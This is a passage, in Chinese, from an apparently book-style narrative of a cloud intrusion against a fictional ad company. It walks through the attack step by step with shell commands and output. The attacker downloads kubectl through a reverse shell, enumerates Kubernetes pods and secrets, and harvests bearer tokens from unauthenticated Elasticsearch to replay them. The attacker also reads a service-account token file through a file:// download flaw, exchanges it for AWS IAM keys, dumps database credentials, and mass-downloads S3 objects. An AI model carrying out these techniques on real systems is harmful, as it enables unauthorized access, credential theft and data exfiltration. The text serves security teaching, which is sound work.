手动通过 `curl` 查询调用它很麻烦，因为这需要一个冗长且丑陋的 JSON 负载，所以我们通过反向 shell 下载 Kubectl 程序。这次我们不需要设置配置文件，因为 Kubectl 会自动发现集群注入的环境变量，从挂载的目录加载当前令牌，并且可以立即 100% 正常运行。在这里我们下载 Kubectl 二进制文件，使其可执行，并再次检索集群版本：

```
shell> wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl

shell> chmod +x kubectl && ./kubectl version

Server Version: version.Info {Major:"1", Minor:"14+", GitVersion:"v1.14.6-eks-5047ed"...
```

完美！一切都运行良好。现在我们反复对最常见的指令调用 `auth can-i` 命令——`get pods`、`get services`、`get roles`、`get secrets` 等——以充分探索分配给我们正在操作的此默认令牌的所有权限：



## 权限检查

```shell
./kubectl auth can-i get nodes
```

no

```shell
./kubectl auth can-i get pods
```

yes

我们很快得出结论，我们目前唯一的权限是在集群中列出 Pod。但当我们显式调用 `get pods` 命令时，我们收到以下错误：

```shell
./kubectl get pods
```

Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:prod:default" cannot list resource "pods" in
API group "" in the namespace "default"

如果我们尝试定位 `prod` 命名空间——与我们的服务账号所在的同一命名空间呢？

```shell
./kubectl get pods -n prod
```

stats-deployment-41de-4jxa1    1/1 Running   0   13h51m
redis-depl-69dc-0vslf          1/1 Running   0   21h43m
ssp-elastic-depl-3dbc-3qozx    1/1 Running   0   14h39m
ssp-feeder-deployment-13fe-3evx 1/1 Running   0   10h18m
api-core-deployment-d34c-7qxm  1/1 Running   0   10h18m
--snip--

不坏！我们获得了在 `prod` 命名空间中运行的数百个 Pod 的列表。

由于所有缺乏身份的 Pod 都使用相同的默认服务账号运行，如果某个人授予此默认账号额外权限，所有其他使用相同身份运行的 Pod 将自动继承这些相同的权限。只需要有人执行一个无意的 `kubectl apply -f <url>`，该命令会抓取来自某个偏僻 GitHub 仓库的构思不周的资源定义并匆忙将其应用到集群。有时人们说这个 Kubectl 安装命令是新的 `curl <url> | sh`。这就是复杂性的隐藏成本：人们可以盲目地从 GitHub 拉取并应用清单文件，而不检查甚至不理解他们执行的指令的含义，有时甚至会授予默认服务账号额外权限。这很可能就是本例中发生的情况，因为默认账号没有内置的权限集。

但这只是冰山一角。有了正确的标志，我们甚至可以提取每个 Pod 的整个清单，从而获得绝对海量的信息，如清单 8-3 所示。

```shell
./kubectl get pods -n prod -o yaml > output.yaml
```

```shell
head -100 output.yaml
```

--snip--
spec:
containers:
  - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/api-core
    name: api-core
  - env:
    - name: DB_CORE_PASS
      valueFrom:
        secretKeyRef:
          key: password
          name: dbCorePassword
volumeMounts:
  - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
    name: apicore-token-2mpcg
    readOnly: true
nodeName: ip-192-168-162-215.eu-west-1.compute.internal
hostIP: 192.168.162.215
phase: Running
podIP: 10.0.2.34
--snip--

*Listing 8-3: 下载 Pod 清单文件*

而且那截断的输出，我的朋友们，才仅仅是一个 Pod！我们只有获取 Pod 信息的权限，但这幸运地意味着可以访问 Pod 清单文件，其中包括 Pod 运行的节点、密钥名称、服务账号、挂载的卷等等。这几乎是在一个微小权限下实现了命名空间级别的完整侦察。

不过，输出却极难利用。手动挖掘 YAML 文件是一种惩罚，只应施加在你的死敌身上。我们可以使用 Kubectl 强大的自定义输出过滤器来格式化清单 8-3 的结果：

```shell
./kubectl get pods -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name"
```

| NODE | POD |
|---|---|
| ip-192-168-162-215.eu-... | api-core-deployment-d34c-7qxm |
| ip-192-168-12-123.eu-... | ssp-feeder-deployment-13fe-3evx |
| ip-192-168-89-110.eu-... | redis-depl-69dc-0vslf |
| ip-192-168-72-204.eu-... | audit-elastic-depl-3dbc-3qozx |

这个相当明确的命令只显示 Pod 清单的 `spec.nodeName` 和 `metadata.name` 字段。让我们获取一些额外的数据，比如密钥、服务账号、Pod IP 等等。如清单 8-4 所见，过滤器变得更厚重难以阅读，但它本质上是在 YAML 中遍历数组和映射以获取相关信息。

```shell
./kubectl get pods -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name,\
PODIP:.status.podIP,\
SERVICE:.spec.serviceAccount,\
ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\
FILESECRET:.spec.volumes[*].secret.secretName"
```

| NODE | POD | PODIP | SERVICE | ENV | FILESECRET |
|---|---|---|---|---|---|
| ip-192... | api-... | 10.0.2... | api-token | dbCore... | api-token-... |
| ip-192... | ssp-f... | 10.10... | default | dbCass... | default-... |
| ip-192... | ssp-r... | 10.0.3... | default | <none> | default-... |
| ip-192... | audit... | 10.20... | default | <none> | default-... |
| ip-192... | nexus... | 10.20.... | default | <none> | deploy-secret... |

*Listing 8-4: 命名空间级别的完整侦察：节点和 Pod 名称、Pod IP、服务账号和密钥*

我已截断输出以适应页面，因此我在此描述它。前两列包含节点和 Pod 的名称，有助于我们推断 Pod 内部运行的应用的性质。第三列是 Pod 的 IP，得益于 Kube 的扁平网络设计，这让我们直接到达应用。

第四列列出了附加到每个 Pod 的服务账号。任何不同于 `default` 的值都意味着该 Pod 可能以额外权限运行。

最后两列列出了 Pod 加载的密钥，无论是通过环境变量还是通过磁盘上挂载的文件。密钥可以是数据库密码、用于执行此命令的服务账号令牌等等。

多么适合黑客的好时机！还记得侦察时扫描 `/16` 网络并等待四小时才能得到部分相似的输出的日子吗？现在它离一个命令仅一步之遥。当然，如果默认服务账号缺乏 `get pods` 权限，我们就不得不求助于对容器 IP 范围的盲目网络扫描。AWS 对这种异常网络流量非常敏感，所以在调整 `Nmap` 以保持隐蔽时要小心。

我们在清单 8-4 中检索到的 Pod 名称充满了广告和技术关键词，例如 SSP、api、kafka 等。可以安全地假设 MXR Ads 将其广告投放流程中涉及的所有应用程序都运行在 Kubernetes 上。这必然使他们能够根据流量上下扩展应用程序。我们继续探索其他 Pod，并发现了一些容器，它们实际上加载了 AWS 凭证。哦，这要糟了：

```
NODE    ip-192-168-162-215.eu-west-1.compute.internal
POD     creative-scan-depl-13dd-9swkx
PODIP   10.20.98.12
PORT    5000
SERVICE default
```



ENV     `AWS_SCAN_ACCESSKEY`, `AWS_SCAN_SECRET`

FILESECRET `default-token-2mpcg`

```
我们还发现了一些数据存储，比如 Redis 和 Elasticsearch。这将会很有趣。
```

## Breaking Into Datastores

我们目前最关键的优势是，我们成功跨过了防火墙边界。我们已身处集群内部，在所谓的受信任区域内。DevOps 管理员仍然在虚假的假设下运作，认为存在所谓的受信任网络，即使这玩意儿属于云服务提供商。John Lambert 关于防御者思维的文章 (`https://github.com/JohnLaTwC/Shared`) 仍然切中要害：“Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win.”

Redis 是一种主要用于缓存目的的键值内存数据库，而 Elasticsearch 是一种面向文本搜索查询的文档型数据库。从该 Pod 的描述中我们了解到，Elasticsearch 用于存储部分，甚至可能是全部应用程序的审计日志：

```
NODE    ip-192-168-72-204.eu-west-1.compute.internal

POD     audit-elastic-depl-3dbc-3qozx

PODIP   10.20.86.24

PORT    9200

SERVICE default

ENV    <none>

FILESECRET default-token-2mpcg
```

鉴于受信任网络的荒谬，身份验证和加密是首先被放弃的措施。我至今尚未在内部网络中遇到需要身份验证的 Redis 数据库。Elasticsearch 以及其他著名的非关系型数据库也是如此，它们开玩笑地要求管理员在“安全”环境中运行应用程序，无论这意味着什么。

我理解。安全据说不是管理员的工作；他们更愿意专注于数据的性能、可用性和一致性。但这种思维不仅有缺陷，而且鲁莽。安全是任何数据驱动技术的首要要求。数据包含信息。信息等于权力。自从人类学会八卦以来，这一直是事实。忽视安全的管理员就像核电站声称其唯一工作是分裂铀同位素。安全措施？“No, we don’t do that. We run the reactor inside a secure building.”

我们选择首先关注 Elasticsearch Pod，因为审计日志总是证明是情报的宝贵来源。它们会记录诸如哪个服务正在与哪个数据库通信、哪些 URL 端点处于活动状态以及数据库查询是什么样的等信息。我们甚至可以在调试堆栈跟踪中被疏忽地转储到环境变量中找到密码。

我们回到 Elasticsearch 的 Pod 描述，提取 Pod 的 IP（`10.20.86.24`）和端口（`9200`），并准备查询该服务。Elasticsearch 默认情况下不带任何身份验证，因此得益于“受信任环境”的童话，我们可以完全访问其中存储的数据。

Elasticsearch 将其数据组织成索引，索引只是文档的集合。可以把索引看作传统关系型数据库系统（如 MySQL）中数据库的等价物。在这里，我们提取集群中定义的索引列表：

```
shell> curl "10.20.86.24:9200/_cat/indices?v"

health index id size

yellow test CX9pIf7SSQGPZR01fe6UVQ... 4.4kb

yellow logs dmb1uV2zRsG1XgGskJR5Yw... 154.4gb

yellow dev IWjzCFc4R2Woganp04tvkQ... 4.4kb
```

我们看到有 154GB 的审计日志数据准备好供探索。我们从日志索引中提取最后几份文档：

```
shell> curl "10.20.86.24:9200/log/_search?pretty&size=4"

"hits": [{

--snip--

  "_source": {

  ① "source": "dashboard-7654-1235",

  "level": "info",

  ② "message": "GET /api/dashboard/campaign...\nHost: api-core\nAuthorization Bearer 9dc12d279fee485...",

  "timestamp": "2019-11-10T14:34:46.648883"

}}]
```

Elasticsearch 返回的四个元素中的每个 `message` 字段都包含存储的原始日志消息。我们挖掘出似乎是对 `api/dashboard/campaign/1395412512` URL 的 HTTP 请求 ②。我们还捕捉到对仪表板应用程序的引用，该应用程序我们在第 4 章外部侦察阶段很早就发现了 ①。审计日志中的 URL 表明，由仪表板应用程序加载的广告活动数据很可能从名为 `api-core` 的内部端点检索（参见 Host 头）②。

有趣的是，我们检索到的 HTTP 消息携带了一个授权令牌，可能用于标识请求数据的用户。我们可以通过在 Elasticsearch 中应用适当的搜索过滤器 `message:Authorization` 来锁定日志索引中存储的所有令牌。这应该使我们能够收集足够的令牌来冒充仪表板应用程序上的所有当前活跃用户：

```
shell> curl "10.20.86.24:9200/log/_search?pretty&size=12&q=message:Authorization"

"_timestamp": 1600579234

"message": "...Host: api-core\nAuthorization Bearer 8b35b04bebd34c1abb247f6baa5dae6c..."

"_timestamp": 1600581600

"message": "...Host: api-core\nAuthorization Bearer 9947c7f0524965d901fb6f43b1274695..."

--snip--
```

好，我们在过去 12 小时内用于访问仪表板应用程序（以及由此延伸的 `api-core` Pod）的令牌超过十几个。希望其中一些仍然有效，可以用于重放攻击。

由于 Kube 的自动 DNS 解析，我们可以访问 `api-core` 服务名称后面的 Pod。或者，我们也可以直接获取其中一个 Pod 的 IP 地址，如下所示：

```
shell> kubectl get pods -o wide | grep "api-core"

NODE    ip-192-168-162-215.eu-west-1.compute.internal

POD     api-core-deployment-d34c-7qxm

PODIP   10.0.2.34

PORT    8080
```

我们重放从审计索引中提取的随机 URL，并附带其授权令牌：

```
shell> curl http://10.0.2.34/api/dashboard/campaign/1395412512 \
-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"

{
  "progress": "0.3",
  "InsertionID": "12387642",
  "creative": "s4d.mxrads.com/7bcdfe206ed7c1159bb0152b7/...",
  "capping": "40",
  "bidfactor": "10",
--snip--
```

我们进来了！我们可能还没有访问漂亮的仪表板来可视化这些指标——至少目前还没有——但我们终于瞥见了部分原始广告活动数据。额外收获：我们检索到了广告中提供的视频文件和图像的位置 ①。让我们看看那个 URL：

```
root@Point1:/# getent -t hosts s4d.mxrads.com

13.225.38.103   s4d.mxrads.com.s3.amazonaws.com
```

令人惊讶的是，它重定向到一个 S3 存储桶。我们看看是否可以进入该存储桶，但遗憾的是，我们不被允许列出其内容，而且密钥看起来太随机而无法暴力破解。也许 API 提供了按客户端名称搜索的方式来减轻我们的负担？

## API Exploration

我们想要找到一种在 API 中列出客户端名称、视频以及任何其他可能相关内容的方法。我们开始摆弄 API，发送无效 ID 和随机 URL 路径，并附带有效的 bearer 令牌，希望触发任何形式的帮助消息或详细错误：

```
shell> curl "http://10.0.2.34/api/randomPath" \
-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"
```



{"level":"critical", "message":"Path not found. Please refer to the docs (`/docs/v3`) for more information"}...

```
```

我们被引导到某个文档 URL。对 `/docs/v3` URL 的一次查询就吐出了 API 的完整文档：有哪些端点可用、要发送的参数、要包含的头等等。多么好心啊！

事实证明，我们的直觉并不算太离谱：授权令牌确实与最终用户及其广告活动的范围绑定。我们抓取的随机令牌不太可能有资格查看或编辑 Gretsch Politico 的广告活动（除非，当然，有一个活跃的 GP 用户或管理员当前正在与 `api-core` Pod 通信——但说真的，我们都知道圣诞节还有几个月才到）。

文档明确指出，`api-core` 端点是 MXR Ads 使用的几乎每个投放应用程序的入口点。它是他们的主要数据库抽象层。它从多个数据源聚合业务信息，并提供投放过程的单一统一概览。

除了你期望一个全能 API 具备的常规命令（获取广告活动、列出插入、查找排除列表等等）之外，文档还提到了一个额外的功能，挠到了我们的黑客直觉：使用报告。该功能描述如下：“the `/usage-report` endpoint generates a report file detailing the health of the API and several metrics to track its performance and configuration.”

配置很不错。我们喜欢“配置”这个词。配置数据通常包含密码、端点定义和其他 API 秘密。但还有更多。他们提到的那份报告文件……它是如何生成的？如何检索？我们可以下载它吗？如果是，我们能否更改 URL 来抓取另一个文件？有没有任何检查？报告生成的动态方面可能为我们提供了一个入口点。

让我们给这个使用报告功能来个老派尝试。我们尝试生成一份报告以更仔细地检查它：

```
shell> curl "http://10.0.2.34/usage-report/generate" \
-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"
```

```
{
  "status": "success",
  "report": "api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4.html"
}
```

```
shell> curl api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4.html
```

```
--snip--
Internal configuration:
Latency metrics:
Environment:
PATH_INFO: '/usage-report'
PWD '/api/'
SHELL '/bin/bash/'

AWS_ROLE_ARN 'arn:aws:iam::886477354405:role/api-core.ec2' ①

AWS_WEB_IDENTITY_TOKEN_FILE '/var/run/secrets/eks.amazonaws.com/serviceaccount/token' ②

DB_CORE_PASS **********
DB_CORE_USER **********
DBENDPOINT=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com ③
--snip--
```

非常有趣！幸运的是 MXR Ads 的使用报告生成器开发者对数据库用户和密码进行了屏蔽，因此那里没有容易的访问途径，但我们仍然获得了数据库端点 ③：`984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com`。显然，数据是从 AWS 上的托管关系数据库获取的——该服务称为 RDS。

暂时先不管数据库。我们发现了一些可能让我们获得更多权限的东西。

我们将重点关注两个特殊变量：`AWS_ROLE_ARN` 和 `AWS_WEB_IDENTITY_TOKEN_FILE`。根据 AWS 文档，每当 IAM 角色附加到 Kube 服务账户时，这两个变量就会由 AWS 管理的 Kubernetes 版本（EKS）注入。此处的 `api-core` pod 可以将其 Kube 身份验证令牌交换为常规 IAM 访问密钥，这些密钥具有 `api-core.ec2` 角色 ① 的权限。一次极佳的权限提升！

### 注意

一些公司在不同设置下可能别无选择，只能允许在给定节点上运行的所有 pod 冒充分配给该节点的角色。然后我们的任务变得容易了几个数量级。其他公司将使用 `kube2iam` 等工具代理所有请求，以限制 pod 的范围。

加载 `AWS_WEB_IDENTITY_TOKEN_FILE` 引用的文件中存储的服务账户令牌并将其交换为 IAM 访问密钥，以查看我们可以使用这些密钥访问什么以及无法访问什么，这会很有趣。

`usage-report` 函数可能有助于我们完成此任务。下载 URL 指向 S3 URL，但很可能它也接受其他 URL 处理程序，例如 `file://` 用于从磁盘加载文档，如服务账户令牌文件 ②：

```
shell> curl api-core/usage-report/file?download=\
file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token

eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwnJjI5Y2FmZGRiOGNjY2UzNjBiYzFjZGMwYWY4Zm...
```

事情按预期进行时真是太好了！我们获得了服务账户令牌。让我们看看是否可以将其交换为 IAM 密钥。如果我们解码此令牌并将其与之前获得的默认 JWT 进行比较，我们会注意到一些关键差异：

```
{
  ① "aud": ["sts.amazonaws.com"],
  "exp": 1574000351,
  ② "iss": "https://oidc.eks.eu-west-1.amazonaws.com/id/4BAF8F5",
  "kubernetes.io": {
    "namespace": "prod",
    --snip--
    "serviceaccount": {
      "name": "api-core-account",
      "uid": "f9438b1a-087b-11ea-9d5f-06c16d8c2dcc"
    }
    "sub": "system:serviceaccount:prod:api-core-account"
  }
}
```

服务账户令牌具有受众属性 `aud` ①，即将接受我们刚刚解码的令牌的资源服务器。在这里它被设置为 STS——授予临时 IAM 凭证的 AWS 服务。令牌的发行者 ② 不再是服务账户控制器，而是与 EKS 集群一起配置的 OpenID 服务器。OpenID 是一种用于将身份验证委托给第三方的身份验证标准。AWS IAM 信任此 OpenID 服务器以正确签署和验证此 JWT 中的声明。

根据 AWS 文档，如果一切设置正确，IAM 角色 `api-core.ec2` 也将被配置为信任由此 OpenID 服务器签发并带有主题声明 `system:serviceaccount:prod:api-core-account` 的冒充请求。

当我们调用 `aws sts assume-role-with-web-identity` API 并提供必要信息（web 令牌和角色名称）时，我们应该获得有效的 IAM 凭证：

```
root@Pointer1:~# AWS_ROLE_ARN="arn:aws:iam::886477354405:role/api-core.ec2"
root@Pointer1:~# TOKEN="ewJabazetzezet..."

root@Pointer1:~# aws sts assume-role-with-web-identity \
--role-arn $AWS_ROLE_ARN \
--role-session-name sessionID \
--web-identity-token $TOKEN \
--duration-seconds 43200

{
  "Credentials": {
    "SecretAccessKey": "YEqtXSfJb3lHAoRgAERG/I+",
    "AccessKeyId": "ASIA44ZRK6WSYMC5YX6",
    "Expiration": "2019-10-30T19:57:41Z",
    "SessionToken": "FQ0GZXIvYXdzEM3..."
  },
  --snip--
}
```

哈利路亚！我们刚刚将 Kubernetes 服务令牌升级为能够与 AWS 服务交互的 IAM 角色。凭借这种新型访问，我们能造成什么样的影响？

## 利用 IAM 角色权限



api-core 应用程序管理活动，包含托管在 S3 上的创意素材的链接，并具有许多其他功能。可以安全地假设相关 IAM 角色具有一些扩展权限。让我们从一个从一开始就一直困扰我们的明显功能开始——列出 S3 上的存储桶：

```
root@Pointer1:/# aws s3api list-buckets
{
  "Buckets": [
    {
      "Name": "mxrads-terraform",
      "CreationDate": "2017-10-25T21:26:10.000Z"
      "Name": "mxrads-logs-eu",
      "CreationDate": "2019-10-27T19:13:12.000Z"
      "Name": "mxrads-db-snapshots",
      "CreationDate": "2019-10-26T16:12:05.000Z"
--snip--
```

终于！在无数次尝试后，我们终于获得了具有 `ListBuckets` 权限的 IAM 角色。这花了一些时间！

不过别太兴奋。我们确实可以列出存储桶，但这并不能说明我们能否从这些存储桶中检索单个文件。然而，仅通过查看存储桶列表，我们就能对 MXR Ads 的运作方式获得新的见解。

例如，存储桶 `mxrads-terraform` 最有可能存储由 Terraform 生成的状态，Terraform 是一种用于设置和配置云资源（如服务器、数据库和网络）的工具。状态是对 Terraform 生成和管理的全部资产的声明性描述，例如服务器的 IP、子网、IAM 角色、与每个角色和用户关联的权限等等。它甚至存储明文密码。即使我们的目标使用 Vault、AWS Key Management Service `KMS` 或 AWS Secrets Manager 等密钥管理工具，Terraform 也会在运行时解密它们并将其明文版本存储在状态文件中。哦，我们多么希望能访问那个存储桶。让我们试试：

```
root@Pointer1:~/# aws s3api list-objects-v2 --bucket mxrads-terraform
```

调用 `ListObjectsV2` 操作时发生错误（`AccessDenied`）：

Access Denied

唉，没有成功。时机未到。让我们回到我们的存储桶列表。

至少有一个存储桶我们确定 `api-core` 应该能够访问：`s4d.mxrads.com`，它存储所有创意素材。我们将使用我们的 IAM 权限来列出存储桶的内容：

```
root@Pointer1:~/# aws s3api list-objects-v2 --bucket s4d.mxrads.com > list_creatives.txt
root@Pointer1:~/# head list_creatives.txt
{"Contents": [{
"Key": "2aed773247f0203d5e672cb/125dad49652436/vid/720/6aa58ec9f77af0c0ca497f90c.mp4",

"LastModified": "2015-04-08T22:01:48.000Z",
    --snip--
```

嗯……是的，我们确实可以访问 MXR Ads 在广告活动中使用的所有视频和图像，但我们不会下载并播放数 TB 的媒体广告只是为了找到 Gretsch Politico 使用的那些。一定有更好的方法来检查这些文件。

确实有。还记得几分钟前我们检索到的 Kubernetes 服务账户令牌吗？我们太急于将其转换为 AWS 凭证，以至于几乎忘记了它本身所拥有的权限。那个服务账户是检索分配给 `api-core` pod 的集群资源的金牌通行证。你猜 `api-core` 运行需要什么属性？数据库凭证！我们将利用 DB 访问来定位 Gretsch Politico 创意素材，然后使用我们新获得的 IAM 访问权限从 S3 下载这些视频。

## 利用服务账户权限

我们回到我们忠实的反向 shell，并向 API 服务器发出新的 `curl` 命令，这次携带 `api-core` JWT。我们请求在 pod 描述中找到的 secret，`dbCorepassword`：

```
shell> export TOKEN="ewJabazetzezet..."
shell> curl -kL \
https://10.100.0.1/api/v1/namespaces/prod/secrets/dbCorepassword \
--header "Authorization: Bearer $TOKEN"
{
  "kind": "Secret",
  "data": {
    "user": "YXBpLWNvcmUtcnc=",
    "password": "ek81akxXbGdyRzdBUzZs" }}
```

然后我们解码用户名和密码：

```
root@Point1:~/# echo YXBplWvcmUtcnc= |base64 -d
api-core-rw
root@Point1:~/# echo ek81akxXbGdyRzdBUZs |base64 -d
z05jLWlgrG7AS6l
```

于是，活动数据库凭证为 `api-core-rw` / `z05jLWlgrG7AS6l`。

## 渗透数据库

让我们从集群发起对数据库的连接，以防 RDS 实例受到某些入站防火墙规则的保护。我们并不知道确切会查询哪个数据库后端（RDS 支持 MySQL、Aurora、Oracle、SQL Server 等）。由于 MySQL 是最流行的引擎，我们先尝试它：

```
shell> export DBSERVER=984195.cehmzvc73g1g.eu-west-1.rds.amazonaws.com

shell> apt install -y mysql-client
shell> mysql -h $DBSERVER -u api-core-rw -pz05jLWlgrG7AS6l -e "Show databases;"
+---------------+
| Database      |
+---------------+
| information_schema |
| test          |
| campaigns     |
| bigdata       |
| taxonomy      |
--snip--
```

我们进来了。

定位 Gretsch Politico 的活动需要一些基础的 SQL 知识，这里我就不详细展开了。我们首先列出服务器上的每个列、表和数据库。这些信息在 `information_schema` 数据库的 `COLUMN_NAME` 表中可以轻松获取：

```
shell> mysql -h $DBSERVER -u api-core-rw -pz05jLWlgrG7AS6l -e\
"select COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA,TABLE_CATALOG from information_schema.columns;"
+---------------+---------------+---------------+
| COLUMN_NAME   | TABLE_NAME    | TABLE_SCHEMA  |
+---------------+---------------+---------------+
| counter      | insertions    | api           |
| id_entity     | insertions    | api           |
| max_budget    | insertions    | api           |
--snip--
```

我们挑选出最可能包含活动数据的几个列和表，然后通过几个带有 `join` 操作的 `select` 语句查询信息。这应该能给我们提供活动的列表、创意 URL 以及每个活动的预算——所有我们想要的信息。我们确保再次传入我们窃取的凭证：



```
shell> mysql -h $DBSERVER -u api-core-rw -pz05jLWlgrG7AS6l campaigns -e\
"select ee.name, pp.email, pp.hash, ii.creative, ii.counter, ii.max_budget\
from insertions ii\
inner join entity ee on ee.id= ii.id_entity\
inner join profile pp on pp.id_entity= ii.id_entity\
where ee.name like "%gretsch%""
```

---
Name : Gretsch Politico
Email: eloise.stinson@gretschpolitico.com
Hash: c22fe077aaccbc64115ca137fc3a9dcf
Creative: s4d.mxrads.com/43ed90147211803d546734ea2d0cb/12adad49658582436/vid/720/88b4ab3d165c1cf2.mp4
Counter: 16879
Max_budget: 250000
---
--snip--

看起来 GP 的客户在当前运行的每一条 200 条广告上都花费了数十万美元。这可真是不少钱。

我们遍历数据库中找到的所有创意 URL 并从 S3 中检索它们。

还记得黑客需要精心设计数据外泄工具和技术来绕过数据防泄漏措施，并 painstakingly 从公司网络中提取数据的时候吗？是的，我们现在不需要那样做了。

云服务提供商不在乎你在哪里。只要你有正确的凭证，你就可以下载任何你想要的东西。目标很可能会在月底收到一笔高昂的账单，但这几乎不会引起会计部门任何人的注意。MXR Ads anyway 不断在全球范围内投放这些视频。我们只是一次性下载所有内容。

鉴于涉及的创意数量（属于 GP 的几百个），我们将利用一些 `xargs` 技巧来并行化对 `get-object` API 的调用。我们准备一个包含要获取的创意列表的文件，然后遍历每一行并将其提供给 `xargs`：

```
root@Point1:~/creatives# cat list_creatives.txt | \
xargs -I @ aws s3api get-object \
-P 16 \
--bucket s4d.mxrads.com \
--key @ \
$RANDOM
```

`-I` 标志是替换标记，用于确定要插入读取行的位置。`xargs` 中的 `-P` 标志是并发进程的最大数量（我的机器上为 16）。最后，`RANDOM` 是 `bash` 的默认变量，每次求值都会返回一个随机数，并将作为下载的创意的本地名称。让我们看看我们抓到了多少个创意：

```
root@Point1:~/creatives# ls -l |wc -l
264
```

我们获得了 264 个创意——那是 264 条仇恨信息、Photoshop 图像、伪造视频以及精心剪辑的强调两极化信息的片段。一些图像甚至劝阻人们投票。很明显，为了获得期望的选举结果，什么都不在界限之外。

在获取这些视频文件后，我们成功完成了第 4 章中的第 3 个目标。我们仍有两个关键目标需要完成：揭开 GP 客户的真实身份以及了解数据画像活动的程度。

我们回到 S3 存储桶列表，希望能找到一些机器学习或画像技术（Hadoop、Spark、Flink、Yarn、BigQuery、Jupyter 等）的线索或引用，但没有找到任何有意义且可访问的内容。

### 换个交付链中的另一个组件

我们列出 `prod` 命名空间中运行的所有 Pod 以寻找灵感：

```
shell> ./kubectl get pods -n prod -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name"
```

| 节点 | Pod |
|---|---|
| ip-192-168-133-105.eu-... | vast-check-deployment-d34c-7qxm |
| ip-192-168-21-116.eu-... | ads-rtb-deployment-13fe-3evx |
| ip-192-168-86-120.eu-... | iab-depl-69dc-0vslf |
| ip-192-168-38-101.eu-... | cpm-factor-depl-3dbc-3qozx |
| --snip-- |  |

这些 Pod 名称晦涩得令人难以置信。广告业务与华尔街类似，有一种恶习就是躲在晦涩的缩写后面，制造怀疑和混乱。因此，在花了几个小时在维基百科上研究破译这些名称后，我们决定专注于 `ads-rtb` 应用。RTB 代表实时竞价，是一种用于进行拍卖的协议，该拍卖决定在网站上显示特定广告而非其他广告。

每当用户在与 MXR Ads 合作的网站上加载页面时，一段 JavaScript 代码会触发对 MXR Ads 供给方平台（SSP）的调用以运行拍卖。MXR Ads 的 SSP 将请求转发给其他 SSP、广告代理或品牌以收集他们的出价。每个代理作为需求方平台（DSP）出价一定金额以展示其选择的广告。他们愿意出价的金额通常基于多个标准：网站的 URL、页面上广告的位置、页面中的关键词，以及最重要的是用户的数据。如果这些标准适合投放广告的客户，他们就会出价更高。这场拍卖使用 RTB 协议自动进行。

RTB Pod 可能无法访问个人数据，只是盲目地将请求中继到由 GP 主办的服务器，但鉴于 RTB 协议在广告投放中的核心地位，这些 Pod 很可能将引领我们找到下一个目标。

## Redis 与实时竞价

我们提取 `ads-rtb` 的 Pod 清单：

```
spec:
  containers:
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/ads-rtb
--snip--
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/redis-rtb
      name: rtb-cache-mem
      ports:
        - containerPort: 6379
          protocol: TCP
  nodeName: ip-192-168-21-116.eu-west-1.compute.internal
  hostIP: 192.168.21.116
  podIP: 10.59.12.47
```

看这个！一个 Redis 容器与 RTB 应用一起运行，监听 `6379` 端口。

如前所述，我还没有见过在内部网络中用身份验证保护的 Redis 数据库，所以你可以想象，我们隐藏在 Kubernetes 集群 Pod 内的 Redis 显然张开双臂欢迎我们。我们下载 Redis 客户端并继续列出数据库中保存的键：

```
shell> apt install redis-tools

shell> redis -h 10.59.12.47 --scan * > all_redis_keys.txt

shell> head -100 all_redis_keys.txt
vast_c88b4ab3d_19devear
select_3799ec543582b38c
vast_5d3d7ab8d4
--snip--
```

每个 RTB 应用都附带一个自己的 Redis 容器，作为本地缓存存储各种对象。键 `select_3799ec543582b38c` 包含一个序列化为字节的 Java 对象字面量。我们可以确定这一点，因为任何 Java 序列化对象都有十六进制字符串标记 `00 05 73 72`，当我们查询该键的值时可以看到它：

```
shell> redis -h 10.59.12.47 get select_3799ec543582b38c

AAVzcgA6Y29tLm14cmFkcySydGIuUmVzdWx0U2VOJEJpZFJ1cXVlc3SzvY…
```

```
shell> echo -ne AAVzcgA6Y29tLm14cmFkcySydGI...| base64 -d | xxd
aced 0005 7372 003a 636f 6d2e 6d78 7261 ......sr.:com.mxra
6473 2e72 7462 2e52 6573 756c 7453 6574 ds.rtb.ResultSet$B
2442 6964 5265 7175 6573 74b3 bd8d d306 $BidRequest......
091f ef02 003d dd...
```

与其每次都从数据库中重复检索相同的结果并无谓地承担昂贵的网络延迟成本，`ads-rtb` 容器会将之前的数据库结果（字符串、对象等）保存在其本地 Redis 容器缓存中。如果相同的请求稍后再次出现，它几乎可以瞬间从 Redis 中获取相应的结果。

这种缓存形式在最初的应用设计中可能被誉为一个很棒的想法，但它涉及一个危险且经常被忽视的操作：反序列化。



## Deserialization

当 Java 对象（或几乎任何高级语言的对象，例如 Python、C# 等）被反序列化时，它会从字节流转换回一系列属性，从而填充一个真正的 Java 对象。此过程通常由目标类的 `readObject` 方法执行。

这里有一个快速示例，展示 ads-rtb 内部可能发生的情况。在代码的某个地方，应用程序从 Redis 缓存加载字节数组并初始化输入流：

```
// Retrieve serialized object from Redis
byte[] data = FetchDataFromRedis()
// Create an input stream
ByteArrayInputStream bis = new ByteArrayInputStream(data);
```

接下来，这一串字节会被 `ObjectInputStream` 类消费，该类实现了 `readObject` 方法。此方法提取类、其签名以及静态和非静态属性，有效地将一系列字节转换为真正的 Java 对象：

```
// Create a generic Java object from the stream
ObjectInputStream ois = new ObjectInputStream(bis);
// Calling readObject of the bidRequest class to format/prepare the raw data
BidRequest objectFromRedis = (BidRequest)ois.readObject();
```

